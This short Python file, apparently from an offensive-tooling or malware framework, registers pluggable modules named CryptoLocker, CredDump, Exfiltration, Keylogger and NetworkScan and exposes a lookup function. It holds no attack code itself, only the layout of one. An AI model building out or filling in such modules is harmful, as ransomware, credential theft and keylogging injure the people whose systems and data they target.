from backend.classes.modules.base_module import BaseModule
from backend.classes.modules.crypto_module import CryptoLocker
from backend.classes.modules.encoder_module import Encoder
from backend.classes.modules.netscan_module import NetworkScan
from backend.classes.modules.creddump_module import CredDump
from backend.classes.modules.exfil_module import Exfiltration
from backend.classes.modules.keylogger_module import Keylogger

_MODULE_REGISTRY: dict[str, BaseModule] = {
    "cryptolocker": CryptoLocker(),
    "netscan": NetworkScan(),
    "creddump": CredDump(),
    "exfil": Exfiltration(),
    "keylogger": Keylogger(),
}


def get_module(name: str) -> BaseModule | None:
    return _MODULE_REGISTRY.get(name.lower())
